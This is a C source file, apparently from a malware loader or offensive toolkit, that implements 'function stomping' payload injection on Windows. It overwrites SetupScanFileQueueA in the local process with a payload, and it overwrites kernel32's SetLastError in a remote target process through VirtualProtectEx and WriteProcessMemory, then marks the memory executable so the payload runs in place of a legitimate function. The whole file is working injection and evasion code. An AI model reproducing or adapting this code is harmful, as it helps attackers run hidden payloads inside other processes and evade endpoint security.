#include "payload_loading.h"
#include <setupapi.h>

#pragma comment (lib, "Setupapi.lib") // adding "setupapi.dll" to the import address table


BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    *pAddress = &SetupScanFileQueueA;
	DWORD	dwOldProtection = 0;


	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	_memcpy(*pAddress, pPayload, sPayloadSize);

	if (!VirtualProtect(*pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN HANDLE hProcess) {
    DWORD	dwOldProtection = 0;
	SIZE_T	sNumberOfBytesWritten = 0;

	DebugPrint("[i] Found Target Process Pid: %d \n", GetProcessId(hProcess));

	if (!GetRemoteProcAddress(hProcess, "kernel32.dll", "SetLastError", pAddress)) {
		DebugPrint("[!] Failed to resolve remote function address.\n");
		return FALSE;
	}

	DebugPrint("[i] Resolved Address: 0x%p\n", *pAddress);

	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, *pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		DebugPrint("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
